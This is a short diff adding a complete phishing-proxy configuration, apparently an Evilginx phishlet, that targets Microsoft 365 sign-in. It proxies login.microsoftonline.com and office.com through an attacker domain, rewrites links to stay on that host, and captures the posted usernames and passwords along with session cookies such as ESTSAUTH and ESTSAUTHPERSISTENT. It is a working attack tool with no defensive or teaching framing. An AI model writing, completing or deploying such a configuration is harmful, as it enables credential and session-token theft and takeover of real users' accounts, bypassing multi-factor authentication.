@@ -1,0 +1,28 @@
+# PHISHLET FINAL : MICROSOFT O365 (VANTABLACK SECURED)
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true}
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login.microsoftonline.com/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/javascript', 'application/json']}
+
+auth_tokens:
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+  - domain: '.office.com'
+    keys: ['SessionToken', 'Office_SessId']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
